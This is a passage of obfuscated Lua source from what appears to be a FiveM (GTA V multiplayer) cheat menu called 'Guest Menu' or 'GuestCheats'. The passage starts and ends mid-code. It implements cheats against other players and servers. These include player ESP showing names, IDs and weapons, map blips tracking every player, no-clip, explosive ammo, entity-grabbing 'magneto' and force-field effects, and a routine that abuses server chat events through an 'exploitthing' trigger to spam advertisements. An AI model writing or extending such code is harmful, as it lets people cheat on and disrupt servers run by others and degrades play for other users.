    SetVehicleNeonLightEnabled(veh, 2, true)
    SetVehicleNeonLightEnabled(veh, 3, true)
    SetVehicleNeonLightEnabled(veh, 4, true)
    SetVehicleNeonLightEnabled(veh, 5, true)
    SetVehicleNeonLightEnabled(veh, 6, true)
    SetVehicleNeonLightEnabled(veh, 7, true)
    SetVehicleNeonLightsColour(veh, I.mainColor.r, I.mainColor.g, I.mainColor.b)
    SetVehicleModKit(veh, 0)
    ToggleVehicleMod(veh, 20, true)
    SetVehicleModKit(veh, 0)
    SetVehicleTyreSmokeColor(veh, I.mainColor.r, I.mainColor.g, I.mainColor.b)
    SetVehicleNumberPlateTextIndex(veh, true)
end
I.functions.fba2216aaf6186e68bf79e252c7dda = function(g4)
    SetVehicleModKit(g4, 0)
    SetVehicleMod(g4, 11, GetNumVehicleMods(g4, 11) - 1, false)
    SetVehicleMod(g4, 12, GetNumVehicleMods(g4, 12) - 1, false)
    SetVehicleMod(g4, 13, GetNumVehicleMods(g4, 13) - 1, false)
    SetVehicleMod(g4, 15, GetNumVehicleMods(g4, 15) - 2, false)
    SetVehicleMod(g4, 16, GetNumVehicleMods(g4, 16) - 1, false)
    ToggleVehicleMod(g4, 17, true)
    ToggleVehicleMod(g4, 18, true)
    ToggleVehicleMod(g4, 19, true)
    ToggleVehicleMod(g4, 21, true)
end
I.functions.fb0c2bc4ba54c60cd98ee1a728ab45e = function(it)
    local x, y, z =
        d.Main.GuestTable.GuestUnPack(
        GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5)
    )
    local veh = it
    if veh == nil then
        veh = "elegy"
    end
    local iu = GetHashKey(veh)
    RequestModel(iu)
    d.Main.GuestThread(
        function()
            local iv = 0
            while not HasModelLoaded(iu) do
                iv = iv + 100
                d.Main.GuestWait(100)
                if iv > 5000 then
                    Guestcustomnotif("~p~Guest Menu : ~s~Could not spawn this vehicle!", 0)
                    break
                end
            end
            local iw =
                I.natives.e087206cc908106f5b9548005fa39fd(iu, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
            SetVehicleStrong(iw, true)
            SetVehicleEngineOn(iw, true, true, false)
            SetVehicleEngineCanDegrade(iw, false)
            if I.OptionConfig.vehSpawnUpgraded then
                I.functions.f9c87ad6955fa7d2353023a55e5742a5(iw)
            end
            if I.OptionConfig.vehSpawnInside then
                SetPedIntoVehicle(I.Guestdata.pLocalPlayer.pedId, iw, -1)
            end
        end
    )
end
I.functions.b8bb6a6560cb3ac96edc69c960db7560 = function(data)
    d.Main.GuestThread(
        function()
            local iv = 0
            if data.hash == nil then
                data.hash = "elegy"
            end
            if not data.coords then
                data.coords = GetEntityCoords(I.Guestdata.pLocalPlayer.pedId)
            end
            RequestModel(data.hash)
            while not HasModelLoaded(data.hash) do
                iv = iv + 100
                d.Main.GuestWait(100)
                if iv > 5000 then
                    I.functions.sendNotification("Could not spawn this vehicle!")
                    break
                end
            end
            local ix =
                I.natives.e087206cc908106f5b9548005fa39fd(
                data.hash,
                data.coords,
                GetEntityHeading(I.Guestdata.pLocalPlayer.pedId),
                true,
                true
            )
            SetVehicleStrong(ix, true)
            SetVehicleEngineOn(ix, true, true, false)
            SetVehicleEngineCanDegrade(ix, false)
            if not I.functions.game.isNullOrEmpty(data.plate) then
                SetVehicleNumberPlateText(ix, data.plate)
            end
            if I.OptionConfig.vehSpawnUpgraded then
                I.functions.f9c87ad6955fa7d2353023a55e5742a5(ix)
            end
            if data.setIn then
                SetPedIntoVehicle(I.Guestdata.pLocalPlayer.pedId, ix, -1)
            end
            if data.props then
                I.functions.game.setVehicleProperties(ix, data.props)
            end
        end
    )
end
I.functions.customBullet = function()
    function rotDirection(iy)
        local iz = iy.z * 0.0174532924
        local iA = iy.x * 0.0174532924
        local H =
            d.Main.GuestMath.GuestAbs(
            d.Main.GuestMath.GuestCos(
                iA
            )
        )
        local iB =
            vector3(
            -d.Main.GuestMath.GuestSin(
                iz
            ) * H,
            d.Main.GuestMath.GuestCos(
                iz
            ) * H,
            d.Main.GuestMath.GuestSin(
                iA
            )
        )
        return iB
    end
    d.Main.GuestThread(
        function()
            local iC =
                I.NewFunction.sdfibdsfuyeazgazeaz(
                GetGameplayCamCoord(),
                GetEntityCoords(I.Guestdata.pLocalPlayer.pedId, true)
            )
            local iD =
                I.NewFunction.sdfibdsfuyeazgazeaz(
                GetGameplayCamCoord(),
                GetEntityCoords(I.Guestdata.pLocalPlayer.pedId, true)
            )
            iC = iC + 0.25
            iD = iD + 1000.0
            if IsPedShooting(I.Guestdata.pLocalPlayer.pedId) then
                local iE = GetHashKey(I.menuTables.weaponsCustomBullet.actual)
                if not HasWeaponAssetLoaded(iE) then
                    RequestWeaponAsset(iE, 31, false)
                    while not HasWeaponAssetLoaded(iE) do
                        d.Main.GuestWait(0)
                    end
                end
                I.natives.shootSingleBulletBetweenCoords(
                    I.NewFunction.lodfdsfuaazratfe(
                        GetGameplayCamCoord(),
                        I.NewFunction.dsfndsifgqbqz(rotDirection(GetGameplayCamRot(0)), iC)
                    ).x,
                    I.NewFunction.lodfdsfuaazratfe(
                        GetGameplayCamCoord(),
                        I.NewFunction.dsfndsifgqbqz(rotDirection(GetGameplayCamRot(0)), iC)
                    ).y,
                    I.NewFunction.lodfdsfuaazratfe(
                        GetGameplayCamCoord(),
                        I.NewFunction.dsfndsifgqbqz(rotDirection(GetGameplayCamRot(0)), iC)
                    ).z,
                    I.NewFunction.lodfdsfuaazratfe(
                        GetGameplayCamCoord(),
                        I.NewFunction.dsfndsifgqbqz(rotDirection(GetGameplayCamRot(0)), iD)
                    ).x,
                    I.NewFunction.lodfdsfuaazratfe(
                        GetGameplayCamCoord(),
                        I.NewFunction.dsfndsifgqbqz(rotDirection(GetGameplayCamRot(0)), iD)
                    ).y,
                    I.NewFunction.lodfdsfuaazratfe(
                        GetGameplayCamCoord(),
                        I.NewFunction.dsfndsifgqbqz(rotDirection(GetGameplayCamRot(0)), iD)
                    ).z,
                    250,
                    true,
                    iE,
                    I.Guestdata.pLocalPlayer.pedId,
                    true,
                    false,
                    -1.0
                )
            end
        end
    )
end
I.functions.e2f78231b10c0c979c5b454af2028f = function()
    if I.natives.isDisabledControlPressed(0, A["MOUSE1"]) then
        local cd, gA =
            d.Main.GuestAimMore.GuestGetCurrentPedWeapon(
            I.Guestdata.pLocalPlayer.pedId
        )
        local launchPos =
            GetEntityCoords(
            d.Main.GuestAimMore.GuestGetCurrentPedWeaponEntityIndex(
                I.Guestdata.pLocalPlayer.pedId
            )
        )
        local bW = GetGameplayCamCoord() + fjqdisfhqdsiughqdsfg() * 200.0
        ClearAreaOfProjectiles(launchPos, 0.0, 1)
        I.natives.shootSingleBulletBetweenCoords(
            launchPos,
            bW,
            5,
            1,
            gA,
            I.Guestdata.pLocalPlayer.pedId,
            true,
            true,
            24000.0
        )
        if I.OptionConfig.weapExplosiveAmmo then
            I.natives.shootSingleBulletBetweenCoords(
                launchPos,
                bW,
                5,
                1,
                "WEAPON_GRENADE",
                I.Guestdata.pLocalPlayer.pedId,
                true,
                true,
                24000.0
            )
        end
    end
end
I.functions.bd411d052b3b330007ad0a673acb = function()
    local cd, x, y = false, 0.0, 0.0
    d.Main.GuestThread(
        function()
            while I.OptionConfig.visESPEnable and I.shouldShowMenu do
                local h4 = I.natives.GetActivePlayers()
                I.NewFunction.e6e59332a9c38c68fcc442343821f4f9(h4, PlayerId())
                for b7 = 1, #h4 do
                    local iF = GetEntityCoords(GetPlayerPed(h4[b7]))
                    cd, x, y =
                        d.Main.GuestAimMore.GetScreenCoordFromWorldCoord(
                        iF.x,
                        iF.y,
                        iF.z
                    )
                    local distance =
                        GetDistanceBetweenCoords(
                        GetEntityCoords(I.Guestdata.pLocalPlayer.pedId),
                        iF
                    )
                    if distance <= I.OptionConfig.visualsESPDistance then
                        local iG, iH =
                            d.Main.GuestAimMore.GuestGetCurrentPedWeapon(
                            GetPlayerPed(h4[b7]),
                            1
                        )
                        local iI = I.NewFunction.qdsfipqjsgioqzhjgoqhg(iH)
                        local gm = "On Foot"
                        if IsPedInAnyVehicle(GetPlayerPed(h4[b7]), 0) then
                            gm =
                                GetLabelText(
                                GetDisplayNameFromVehicleModel(
                                    GetEntityModel(GetVehiclePedIsUsing(GetPlayerPed(h4[b7])))
                                )
                            )
                        end
                        if iI == nil then
                            iI = "Unknown"
                        end
                        local iJ = ""
                        local iK = ""
                        if I.OptionConfig.visESPShowID then
                            iJ = iJ .. "~s~ | ID: ~s~" .. GetPlayerServerId(h4[b7])
                        end
                        if I.OptionConfig.visESPShowName then
                            iJ = iJ .. "~s~ | Name: ~s~" .. GetPlayerName(h4[b7])
                        end
                        if I.OptionConfig.visESPShowDistance then
                            iJ =
                                iJ ..
                                "~s~ | Distance: ~s~" ..
                                    d.Main.GuestMath.GuestFloor(
                                        distance
                                    ) ..
                                        "~s~ |"
                        end
                        if I.OptionConfig.visESPShowWeapon then
                            iK = iK .. "~s~ | Weapon: ~s~" .. iI
                        end
                        if I.OptionConfig.visESPShowVehicle then
                            iK = iK .. "~s~ | Vehicle: ~s~" .. gm
                        end
                        I.DrawTxt(iJ, x - 0.04, y - 0.04, 0.0, 0.3, I.mainColor)
                        I.DrawTxt(iK, x - 0.04, y - 0.03, 0.0, 0.3, I.mainColor)
                    end
                end
                d.Main.GuestWait(
                    I.OptionConfig.visualsESPRefreshRate
                )
            end
        end
    )
end
I.functions.cc1ff3b776a022a5ec5b294ad7cc0ac = function()
    I.OptionConfig.noClip = not I.OptionConfig.noClip
    if not I.OptionConfig.noClip then
        SetEntityRotation(I.Guestdata.pLocalPlayer.cVehicle, GetGameplayCamRot(2), 2, 1)
    end
end
I.functions.e58b4efdde3c0191a2b9cc78b56dd = function()
    VehicleSnatcher = not VehicleSnatcher
    if VehicleSnatcher then
        E = "Steal a car in freecam"
        f2d640737d4432402aea6bcbdc90252(GetGameplayCamFov())
    else
        E = false
        fc858f4ad9b7e9c12fcddc1e6ae220a6()
    end
end
I.functions.b0a371204d3b7bcbe18651bd49a9 = function()
    local af =
        GetGameplayCamRelativeHeading() + GetEntityHeading(I.Guestdata.pLocalPlayer.pedId)
    local fY = GetGameplayCamRelativePitch()
    local x =
        -d.Main.GuestMath.GuestSin(
        af * d.Main.GuestMath.GuestPi /
            180.0
    )
    local y =
        d.Main.GuestMath.GuestCos(
        af * d.Main.GuestMath.GuestPi /
            180.0
    )
    local z =
        d.Main.GuestMath.GuestSin(
        fY * d.Main.GuestMath.GuestPi /
            180.0
    )
    local iL =
        d.Main.GuestMath.GuestSqrt(
        x * x + y * y + z * z
    )
    if iL ~= 0 then
        x = x / iL
        y = y / iL
        z = z / iL
    end
    return x, y, z
end
I.functions.cbc2122e234fe19dc65c7df5c3fe7f = function(K)
    if not IsPedInAnyVehicle(K, false) then
        return
    else
        veh = GetVehiclePedIsIn(K)
        for b7 = 0, GetVehicleMaxNumberOfPassengers(veh) do
            if c2c74f255aa73c2253afc9ecc82InVehicleSeat(veh) then
                return b7
            end
        end
    end
end
I.functions.a45f51ed515827ac9468de1f98359cb = function()
    local iM = 5
    local iN = 5
    local iO = IsPedInAnyVehicle(I.Guestdata.pLocalPlayer.pedId, 0)
    local h = nil
    local x, y, z = nil
    if not iO then
        h = I.Guestdata.pLocalPlayer.pedId
        x, y, z =
            d.Main.GuestTable.GuestUnPack(
            GetEntityCoords(I.Guestdata.pLocalPlayer.pedId, 2)
        )
    else
        h = I.Guestdata.pLocalPlayer.cVehicle
        x, y, z =
            d.Main.GuestTable.GuestUnPack(
            GetEntityCoords(I.Guestdata.pLocalPlayer.pedId, 1)
        )
    end
    if
        iO and
            I.functions.cbc2122e234fe19dc65c7df5c3fe7f(I.Guestdata.pLocalPlayer.pedId) ~= -1
     then
        I.NewFunction.fhdfsqodjfgsh(h)
    end
    local iP, iQ, iR = I.functions.b0a371204d3b7bcbe18651bd49a9()
    SetEntityVelocity(h, 0.0001, 0.0001, 0.0001)
    if IsDisabledControlJustPressed(0, A["LEFTSHIFT"]) then
        iN = iM
        iM = iM * 2
    end
    if IsDisabledControlJustReleased(0, A["LEFTSHIFT"]) then
        iM = iN
    end
    if I.natives.isDisabledControlPressed(0, 32) then
        x = x + iM * iP
        y = y + iM * iQ
        z = z + iM * iR
    end
    if I.natives.isDisabledControlPressed(0, 269) then
        x = x - iM * iP
        y = y - iM * iQ
        z = z - iM * iR
    end
    if I.natives.isDisabledControlPressed(0, A["SPACE"]) then
        z = z + iM
    end
    if I.natives.isDisabledControlPressed(0, A["LEFTCTRL"]) then
        z = z - iM
    end
    I.natives.c3188c79a068242c231f422e25ebbaeNoOffset(h, x, y, z, true, true, true)
end
I.functions.dcbac0a08778fb9e3b9045c19dd7 = function()
    if I.OptionConfig.dcbac0a08778fb9e3b9045c19dd7 then
        d.Main.GuestThread(
            function()
                local iS = A[I.keyBinds.currentKeybindMagneto.handle]
                local iT = 0.5
                local iU = false
                local iV = 0
                local iW = 15
                local iX = false
                local iY = false
                local function iZ()
                    if iU then
                        iV = iV + 1
                        if iV >= iW then
                            iV = 0
                            iU = false
                        end
                    end
                    if I.natives.isDisabledControlPressed(0, iS) and not iU and not iX then
                        iU = true
                        iX = true
                    end
                    if iY then
                        iY = false
                        local i_ = I.Guestdata.pLocalPlayer.pedId
                        local j0 = GetGameplayCamRot(2)
                        local j1 = 5
                        local j2 =
                            -(d.Main.GuestMath.GuestSin(
                            d.Main.GuestMath.GuestRad(
                                j0.z
                            )
                        ) *
                            j1 *
                            10)
                        local j3 =
                            d.Main.GuestMath.GuestCos(
                            d.Main.GuestMath.GuestRad(
                                j0.z
                            )
                        ) *
                            j1 *
                            10
                        local j4 = j1 * j0.x * 0.2
                        local j5 = GetVehiclePedIsIn(i_, false)
                        for h in I.NewFunction.sdkfhdshfbdsfhbsaaae() do
                            SetEntityInvincible(h, false)
                            if
                                d.Main.GuestAimMore.GuestIsEntityOnScreen(
                                    h
                                ) and h ~= j5
                             then
                                ApplyForceToEntity(h, 1, j2, j3, j4, 0, 0, 0, true, false, true, true, true, true)
                            end
                        end
                        for h in I.NewFunction.dfjofdnsfsdfsdfdsyu() do
                            if
                                d.Main.GuestAimMore.GuestIsEntityOnScreen(
                                    h
                                ) and h ~= i_
                             then
                                ApplyForceToEntity(h, 1, j2, j3, j4, 0, 0, 0, true, false, true, true, true, true)
                            end
                        end
                    end
                    if I.natives.isDisabledControlPressed(0, iS) and not iU and iX then
                        iU = true
                        iY = true
                        iX = false
                    end
                    if iX then
                        local i_ = I.Guestdata.pLocalPlayer.pedId
                        local j5 = GetVehiclePedIsIn(i_, false)
                        Markerloc =
                            GetGameplayCamCoord() + I.NewFunction.lpdfiodsjqshudvazaerz(GetGameplayCamRot(2)) * 20
                        DrawMarker(
                            28,
                            Markerloc,
                            0.0,
                            0.0,
                            0.0,
                            0.0,
                            180.0,
                            0.0,
                            1.0,
                            1.0,
                            1.0,
                            I.mainColor.r,
                            I.mainColor.g,
                            I.mainColor.b,
                            35,
                            false,
                            true,
                            2,
                            nil,
                            nil,
                            false
                        )
                        for h in I.NewFunction.sdkfhdshfbdsfhbsaaae() do
                            SetEntityInvincible(h, true)
                            if
                                d.Main.GuestAimMore.GuestIsEntityOnScreen(
                                    h
                                ) and h ~= j5
                             then
                                I.NewFunction.fhdfsqodjfgsh(h)
                                FreezeEntityPosition(h, false)
                                I.NewFunction.gdskofjqsiuaghdyzgergerg(h, Markerloc, 0.5, 0.3)
                            end
                        end
                        for h in I.NewFunction.dfjofdnsfsdfsdfdsyu() do
                            if
                                d.Main.GuestAimMore.GuestIsEntityOnScreen(
                                    h
                                ) and h ~= I.Guestdata.pLocalPlayer.pedId
                             then
                                I.NewFunction.fhdfsqodjfgsh(h)
                                SetPedToRagdoll(h, 4000, 5000, 0, true, true, true)
                                FreezeEntityPosition(h, false)
                                I.NewFunction.gdskofjqsiuaghdyzgergerg(h, Markerloc, 0.5, 0.3)
                            end
                        end
                    end
                end
                while I.OptionConfig.dcbac0a08778fb9e3b9045c19dd7 do
                    iZ()
                    d.Main.GuestWait(0)
                end
            end
        )
    end
end
I.functions.applyShockwave = function(entity, j1)
    if not j1 then
        j1 = 50
    end
    local bH = GetEntityCoords(I.Guestdata.pLocalPlayer.pedId)
    local j6 = GetEntityCoords(entity)
    local iP = j6.x - bH.x
    local iQ = j6.y - bH.y
    local iR = j6.z - bH.z
    local distance =
        d.Main.GuestMath.GuestSqrt(
        iP * iP + iQ * iQ + iR * iR
    )
    local j7 = j1 / distance * math.pow(1.04, 1 - distance)
    ApplyForceToEntity(
        entity,
        1,
        j7 * iP,
        j7 * iQ,
        j7 * iR,
        d.Main.GuestMath.GuestRand() *
            d.Main.GuestMath.GuestRand(
                1,
                10
            ),
        d.Main.GuestMath.GuestRand() *
            d.Main.GuestMath.GuestRand(
                -1,
                1
            ),
        d.Main.GuestMath.GuestRand() *
            d.Main.GuestMath.GuestRand(
                -1,
                1
            ),
        true,
        false,
        true,
        true,
        true,
        true
    )
end
I.functions.doForceFieldTick = function(h1)
    local eU = I.Guestdata.pLocalPlayer.pedId
    local coords = GetEntityCoords(I.Guestdata.pLocalPlayer.pedId)
    local h2 = GetPlayersLastVehicle()
    local h3 = IsPedInVehicle(eU, h2, true)
    DrawMarker(
        28,
        coords.x,
        coords.y,
        coords.z,
        0.0,
        0.0,
        0.0,
        0.0,
        180.0,
        0.0,
        h1,
        h1,
        h1,
        180,
        80,
        0,
        35,
        false,
        true,
        2,
        nil,
        nil,
        false
    )
    for h in I.NewFunction.sdkfhdshfbdsfhbsaaae() do
        if (not h3 or h ~= h2) and GetDistanceBetweenCoords(coords, GetEntityCoords(h)) <= h1 * 1.2 then
            I.NewFunction.fhdfsqodjfgsh(h)
            I.functions.applyShockwave(h, 50)
        end
    end
    for h in I.NewFunction.dfjofdnsfsdfsdfdsyu() do
        if
            h ~= I.Guestdata.pLocalPlayer.pedId and
                GetDistanceBetweenCoords(coords, GetEntityCoords(h)) <= h1 * 1.2 and
                not IsPedAPlayer(h)
         then
            I.NewFunction.fhdfsqodjfgsh(h)
            if NetworkHasControlOfEntity(h) then
                SetPedRagdollOnCollision(h, true)
                SetPedRagdollForceFall(h)
                I.functions.applyShockwave(h, 50)
            end
        end
    end
end
I.functions.b78cec7a66d920c954ee50b797e03ad2 = function(ck)
    d.Main.GuestThread(
        function()
            local K = GetPlayerPed(ck)
            SetPedRandomComponentVariation(K, false)
            SetPedRandomProps(K)
        end
    )
end
I.functions.bf51f2ba1500faccd2bbb809a621e0f9 = function()
    if I.Guestdata.trainRide.handle then
        DeleteMissionTrain(I.Guestdata.trainRide.handle)
        I.Guestdata.trainRide.trainSpeed = 5.0
        o("Deleted train")
        I.Guestdata.trainRide.handle = nil
        I.Guestdata.trainRide.handleHasLoaded = false
        d.Main.GuestWait(100)
        if I.Guestdata.trainRide.oldCoords then
            I.functions.bd249ffd8df1cc2f86757331(
                I.Guestdata.trainRide.oldCoords.x,
                I.Guestdata.trainRide.oldCoords.y,
                I.Guestdata.trainRide.oldCoords.z
            )
        end
    else
        I.Guestdata.trainRide.oldCoords =
            GetEntityCoords(I.Guestdata.pLocalPlayer.pedId)
        local j8 = GetHashKey("cablecar")
        local j9 = GetHashKey("metrotrain")
        local ja = GetHashKey("freight")
        local jb = GetHashKey("freightcar")
        local jc = GetHashKey("freightgrain")
        local jd = GetHashKey("freightcont1")
        local je = GetHashKey("freightcont2")
        local jf = GetHashKey("freighttrailer")
        RequestModel(j8)
        RequestModel(j9)
        RequestModel(ja)
        RequestModel(jb)
        RequestModel(jc)
        RequestModel(jd)
        RequestModel(je)
        RequestModel(jf)
        while not HasModelLoaded(j8) do
            d.Main.GuestWait(0)
        end
        while not HasModelLoaded(j9) do
            d.Main.GuestWait(0)
        end
        while not HasModelLoaded(ja) do
            d.Main.GuestWait(0)
        end
        while not HasModelLoaded(jb) do
            d.Main.GuestWait(0)
        end
        while not HasModelLoaded(jc) do
            d.Main.GuestWait(0)
        end
        while not HasModelLoaded(jd) do
            d.Main.GuestWait(0)
        end
        while not HasModelLoaded(je) do
            d.Main.GuestWait(0)
        end
        while not HasModelLoaded(jf) do
            d.Main.GuestWait(0)
        end
        local eW = GetEntityCoords(I.Guestdata.pLocalPlayer.pedId, false)
        I.Guestdata.trainRide.handle = CreateMissionTrain(24, eW.x, eW.y, eW.z, 1)
        SetVehicleUndriveable(I.Guestdata.trainRide.handle, false)
        TaskWarpPedIntoVehicle(
            I.Guestdata.pLocalPlayer.pedId,
            I.Guestdata.trainRide.handle,
            -1
        )
        o("Spawned train")
        I.Guestdata.trainRide.handleHasLoaded = true
    end
    if I.Guestdata.trainRide.handleHasLoaded then
        if
            I.Guestdata.pLocalPlayer.cVehicle ==
                I.Guestdata.trainRide.handle
         then
            local c9 =
                "Train speed: ~b~" ..
                d.Main.GuestToString(
                    I.Guestdata.trainRide.trainSpeed
                )
            if GetGameTimer() >= timer then
                SetTrainSpeed(
                    I.Guestdata.trainRide.handle,
                    I.Guestdata.trainRide.trainSpeed
                )
                timer = GetGameTimer() + 10
            end
            if IsDisabledControlJustReleased(1, A["UP"]) then
                I.Guestdata.trainRide.trainSpeed =
                    I.Guestdata.trainRide.trainSpeed + 0.1
            elseif IsDisabledControlJustReleased(1, A["DOWN"]) then
                if I.Guestdata.trainRide.trainSpeed - 0.1 >= 0.0 then
                    I.Guestdata.trainRide.trainSpeed =
                        I.Guestdata.trainRide.trainSpeed - 0.1
                end
            end
        end
    end
end
I.functions.dfcac7e80c6b7bc3e666d2811c72508 = function(c9)
    if I.functions.game.isNullOrEmpty(c9) then
        c9 = "GuestCheats | cow2000"
    end
    for jg = 2, 6 do
        I.exploitthing(
            true,
            true,
            "_chat:messageEntered",
            "GuestCheats",
            {I.mainColor.r, I.mainColor.g, I.mainColor.b},
            "^" .. jg .. c9
        )
        if I.functions.f1d4856a114a6894f5812bb126a541b("esx_rpchat") then
            I.exploitthing(
                true,
                true,
                "_chat:messageEntered",
                "GuestCheats",
                {I.mainColor.r, I.mainColor.g, I.mainColor.b},
                "/ooc ^" .. jg .. c9
            )
            I.exploitthing(
                true,
                true,
                "_chat:messageEntered",
                "GuestCheats",
                {I.mainColor.r, I.mainColor.g, I.mainColor.b},
                "/ad ^" .. jg .. c9
            )
        end
    end
end
I.functions.ef1ab0e62a35ec670e9aa2566c5c6e0d = function()
    ClearAllPedProps(I.Guestdata.pLocalPlayer.pedId)
    ClearPedDecorations(I.Guestdata.pLocalPlayer.pedId)
    SetPedComponentVariation(I.Guestdata.pLocalPlayer.pedId, 1, 0, 0, 0)
    SetPedComponentVariation(I.Guestdata.pLocalPlayer.pedId, 5, 0, 0, 0)
    SetPedComponentVariation(I.Guestdata.pLocalPlayer.pedId, 9, 0, 0, 0)
end
I.functions.c6a07916ba03366b1d7a3b7cbdd63466 = function(jh, model, ji)
    if jh == "HATS" or jh == "GLASSES" or jh == "EARS" then
        if jh == "HATS" then
            fam = 0
        elseif jh == "GLASSES" then
            fam = 1
        elseif jh == "EARS" then
            fam = 2
        end
        SetPedPropIndex(I.Guestdata.pLocalPlayer.pedId, fam, model - 1, ji, 1)
    else
        if jh == "FACE" then
            fam = 0
        elseif jh == "MASK" then
            fam = 1
        elseif jh == "HAIR" then
            fam = 2
        elseif jh == "TORSO" then
            fam = 3
        elseif jh == "LEGS" then
            fam = 4
        elseif jh == "HANDS" then
            fam = 5
        elseif jh == "SHOES" then
            fam = 6
        elseif jh == "SPECIAL1" then
            fam = 7
        elseif jh == "SPECIAL2" then
            fam = 8
        elseif jh == "SPECIAL3" then
            fam = 9
        elseif jh == "TEXTURE" then
            fam = 10
        elseif jh == "TORSO2" then
            fam = 11
        end
        SetPedComponentVariation(I.Guestdata.pLocalPlayer.pedId, fam, model, ji, 0)
    end
end
I.functions.cbf752bd7901249a4cdda41e7263db16 = function()
    local ia = I.Guestdata.pLocalPlayer.pedId
    local jj, jk = c2c74f255aa73c2253afc9ecc82NearbyPeds(ia, 30, 30)
    for jl in I.NewFunction.dfjofdnsfsdfsdfdsyu() do
        if jl ~= ia and not IsPedAPlayer(jl) then
            I.natives.adc12da2eac5ceb7b3e53abdbb48(jl, 0)
            ExplodePedHead(jl, GetHashKey("WEAPON_NIGHTSTICK"))
            SetPedToRagdoll(jl, 6, 20, 20, true, true, true)
        end
    end
end
I.functions.b5ea815b0f8440ddaeebad4129bd7222 = function()
    if I.OptionConfig.visb5ea815b0f8440ddaeebad4129bd7222 then
        local h4 = I.natives.GetActivePlayers()
        for b7 = 1, #h4 do
            local aW = h4[b7]
            local K = GetPlayerPed(aW)
            if K ~= I.Guestdata.pLocalPlayer.pedId then
                local i6 = GetBlipFromEntity(K)
                if not DoesBlipExist(i6) then
                    i6 = AddBlipForEntity(K)
                    SetBlipSprite(i6, 1)
                    d.Main.GuestInv(0x5FBCA48327B914DF, i6, true)
                else
                    local veh = GetVehiclePedIsIn(K, false)
                    local jm = GetBlipSprite(i6)
                    if GetEntityHealth(K) == 0 then
                        if jm ~= 274 then
                            SetBlipSprite(i6, 274)
                            d.Main.GuestInv(
                                0x5FBCA48327B914DF,
                                i6,
                                true
                            )
                        end
                    elseif veh then
                        local jn = GetVehicleClass(veh)
                        local jo = GetEntityModel(veh)
                        if jn == 15 then
                            if jm ~= 422 then
                                SetBlipSprite(i6, 422)
                                d.Main.GuestInv(
                                    0x5FBCA48327B914DF,
                                    i6,
                                    true
                                )
                            end
                        elseif jn == 8 then
                            if jm ~= 226 then
                                SetBlipSprite(i6, 226)
                                d.Main.GuestInv(
                                    0x5FBCA48327B914DF,
                                    i6,
                                    true
                                )
                            end
                        elseif jn == 16 then
                            if jo == GetHashKey("besra") or jo == GetHashKey("hydra") or jo == GetHashKey("lazer") then
                                if jm ~= 424 then
                                    SetBlipSprite(i6, 424)
                                    d.Main.GuestInv(
                                        0x5FBCA48327B914DF,
                                        i6,
                                        true
                                    )
                                end
                            elseif jm ~= 423 then
                                SetBlipSprite(i6, 423)
                                d.Main.GuestInv(
                                    0x5FBCA48327B914DF,
                                    i6,
                                    true
                                )
                            end
                        elseif jn == 14 then
                            if jm ~= 427 then
                                SetBlipSprite(i6, 427)
                                d.Main.GuestInv(
                                    0x5FBCA48327B914DF,
                                    i6,
                                    true
                                )
                            end
                        elseif
                            jo == GetHashKey("insurgent") or jo == GetHashKey("insurgent2") or
                                jo == GetHashKey("insurgent3")
                         then
                            if jm ~= 426 then
                                SetBlipSprite(i6, 426)
                                d.Main.GuestInv(
                                    0x5FBCA48327B914DF,
                                    i6,
                                    true
                                )
                            end
                        elseif jo == GetHashKey("limo2") then
                            if jm ~= 460 then
                                SetBlipSprite(i6, 460)
                                d.Main.GuestInv(
                                    0x5FBCA48327B914DF,
                                    i6,
                                    true
                                )
                            end
                        elseif jo == GetHashKey("rhino") then
                            if jm ~= 421 then
                                SetBlipSprite(i6, 421)
                                d.Main.GuestInv(
                                    0x5FBCA48327B914DF,
                                    i6,
                                    false
                                )
                            end
                        elseif jo == GetHashKey("trash") or jo == GetHashKey("trash2") then
                            if jm ~= 318 then
                                SetBlipSprite(i6, 318)
                                d.Main.GuestInv(
                                    0x5FBCA48327B914DF,
                                    i6,
                                    true
                                )
                            end
                        elseif jo == GetHashKey("pbus") then
                            if jm ~= 513 then
                                SetBlipSprite(i6, 513)
                                d.Main.GuestInv(
                                    0x5FBCA48327B914DF,
                                    i6,
                                    false
                                )
                            end
                        elseif
                            jo == GetHashKey("seashark") or jo == GetHashKey("seashark2") or
                                jo == GetHashKey("seashark3")
                         then
                            if jm ~= 471 then
                                SetBlipSprite(i6, 471)
                                d.Main.GuestInv(
                                    0x5FBCA48327B914DF,
                                    i6,
                                    false
                                )
                            end
                        elseif
                            jo == GetHashKey("cargobob") or jo == GetHashKey("cargobob2") or
                                jo == GetHashKey("cargobob3") or
                                jo == GetHashKey("cargobob4")
                         then
                            if jm ~= 481 then
                                SetBlipSprite(i6, 481)
                                d.Main.GuestInv(
                                    0x5FBCA48327B914DF,
                                    i6,
                                    false
                                )
                            end
                        elseif
                            jo == GetHashKey("technical") or jo == GetHashKey("technical2") or
                                jo == GetHashKey("technical3")
                         then
                            if jm ~= 426 then
                                SetBlipSprite(i6, 426)
                                d.Main.GuestInv(
                                    0x5FBCA48327B914DF,
                                    i6,
                                    false
                                )
                            end
                        elseif jo == GetHashKey("taxi") then
                            if jm ~= 198 then
                                SetBlipSprite(i6, 198)
                                d.Main.GuestInv(
                                    0x5FBCA48327B914DF,
                                    i6,
                                    true
                                )
                            end
                        elseif
                            jo == GetHashKey("fbi") or jo == GetHashKey("fbi2") or jo == GetHashKey("police2") or
                                jo == GetHashKey("police3") or
                                jo == GetHashKey("police") or
                                jo == GetHashKey("sheriff2") or
                                jo == GetHashKey("sheriff") or
                                jo == GetHashKey("policeold2")
                         then
                            if jm ~= 56 then
                                SetBlipSprite(i6, 56)
                                d.Main.GuestInv(
                                    0x5FBCA48327B914DF,
                                    i6,
                                    true
                                )
                            end
                        elseif jm ~= 1 then
                            SetBlipSprite(i6, 1)
                            d.Main.GuestInv(
                                0x5FBCA48327B914DF,
                                i6,
                                true
                            )
                        end
                        local jp = GetVehicleNumberOfPassengers(veh)
                        if jp > 0 then
                            if not IsVehicleSeatFree(veh, -1) then
                                jp = jp + 1
                            end
                            ShowNumberOnBlip(i6, jp)
                        else
                            HideNumberOnBlip(i6)
                        end
                    else
                        HideNumberOnBlip(i6)
                        if jm ~= 1 then
                            SetBlipSprite(i6, 1)
                            d.Main.GuestInv(
                                0x5FBCA48327B914DF,
                                i6,
                                true
                            )
                        end
                    end
                    SetBlipRotation(
                        i6,
                        d.Main.GuestMath.GustCeli(
                            GetEntityHeading(veh)
                        )
                    )
